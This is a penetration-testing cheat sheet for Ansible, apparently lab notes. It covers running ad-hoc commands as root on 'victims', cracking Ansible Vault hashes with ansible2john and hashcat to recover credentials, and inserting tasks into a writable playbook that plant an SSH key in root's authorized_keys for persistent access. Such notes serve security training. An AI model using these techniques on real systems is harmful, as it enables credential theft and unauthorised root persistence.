# Ansible

## Glossary

* **Control Machine / Node:** a system where Ansible is installed and configured to connect and execute commands on nodes.
* **Node:** a server controlled by Ansible.
* **Inventory File:** a file that contains information about the servers Ansible controls, typically located at /etc/ansible/hosts.
* **Playbook:** a file containing a series of tasks to be executed on a remote server.
* **Role:** a collection of playbooks and other files that are relevant to a goal such as installing a web server.
* **Play:** a full Ansible run. A play can have several playbooks and roles, included from a single playbook that acts as entry point.

## General

```bash
# Ad-hoc command
ansible victims -a "whoami"
# Ad-hoc command as root
ansible victims -a "whoami" --become
```

| Info                                | Command                                              |
| ----------------------------------- | ---------------------------------------------------- |
| Testing Connectivity to Nodes       | `ansible all -m ping`                                |
| Connect as different users          | `ansible all -m ping -u sammy`                       |
| Connect using custom ssh key        | `ansible all -m ping --private-key=~/.ssh/custom_id` |
| Password based authentication       | `ansible all -m ping --ask-pass`                     |
| Providing the sudo password         | `ansible all -m ping --ask-become-pass`              |
| Using a custom inventory file       | `ansible all -m ping -i digital_ocean.py`            |
| Run adhoc commands                  | `ansible all -a "uname -a"`                          |
| Run adhoc commands (root)           | `ansible victims -a "whoami" --become`               |
| Run adhoc command (Install package) | `ansible server1 -m apt -a "name=vim"`               |
| Run playbook                        | `ansible-playbook myplaybook.yml`                    |
| Run playbook on a single host       | `ansible-playbook -l server1 myplaybook.yml`         |

## Playbooks

{% code overflow="wrap" %}
```bash
# A simple playbook
---
- name: Get system info
  hosts: all
  gather_facts: true
  tasks:
    - name: Display info
      debug:
          msg: "The hostname is {{ ansible_hostname }} and the OS is {{ ansible_distribution }}"
# Running the first playbook
ansible-playbook getinfo.yml
# Playbook containing credentials
---
- name: Write a file as offsec
  hosts: all
  gather_facts: true
  become: yes
  become_user: offsec
  vars:
    ansible_become_pass: lab
  tasks:
    - copy:
          content: "This is my offsec content"
          dest: "/home/offsec/written_by_ansible.txt"
          mode: 0644
          owner: offsec
          group: offsec
# Playbook with credentials encrypted with Ansible Vault
ansible_become_pass: !vault |
          $ANSIBLE_VAULT;1.1;AES256
          39363631613935326235383232616639613231303638653761666165336131313965663033313232
          3736626166356263323964366533656633313230323964300a323838373031393362316534343863
          36623435623638373636626237333163336263623737383532663763613534313134643730643532
          3132313130313534300a383762366333303666363165383962356335383662643765313832663238
          3036
# Decrypt credentials with ansible2john.py
python3 /usr/share/john/ansible2john.py ./test.yml
# Crack credentials with hashcat
hashcat testhash.txt --force --hash-type=16900 /usr/share/wordlists/rockyou.txt
# Copy encrypted vault string to pw.txt on controller
cat pw.txt
$ANSIBLE_VAULT;1.1;AES256
39363631613935326235383232616639613231303638653761666165336131313965663033313232
3736626166356263323964366533656633313230323964300a323838373031393362316534343863
36623435623638373636626237333163336263623737383532663763613534313134643730643532
3132313130313534300a383762366333303666363165383962356335383662643765313832663238
3036
# Decrypt vault string with cracked ansible vault password. To gain credentials stored in playbook. 
cat pw.txt | ansible-vault decrypt
# If playbook is writeable we can add tasks to it. 
---
- name: Get system info
  hosts: all
  gather_facts: true
  become: yes
  tasks:
    - name: Display info
      debug:
          msg: "The hostname is {{ ansible_hostname }} and the OS is {{ ansible_distribution }}"

    - name: Create a directory if it does not exist
      file:
        path: /root/.ssh
        state: directory
        mode: '0700'
        owner: root
        group: root

    - name: Create authorized keys if it does not exist
      file:
        path: /root/.ssh/authorized_keys
        state: touch
        mode: '0600'
        owner: root
        group: root

    - name: Update keys
      lineinfile:
        path: /root/.ssh/authorized_keys
        line: "ssh-rsa AAAAB3NzaC1...Z86SOm..."
        insertbefore: EOF
# Running a shell command as a command task
    - name: Run command
      shell: touch /tmp/mycreatedfile.txt
      async: 10
      poll: 0
```
{% endcode %}
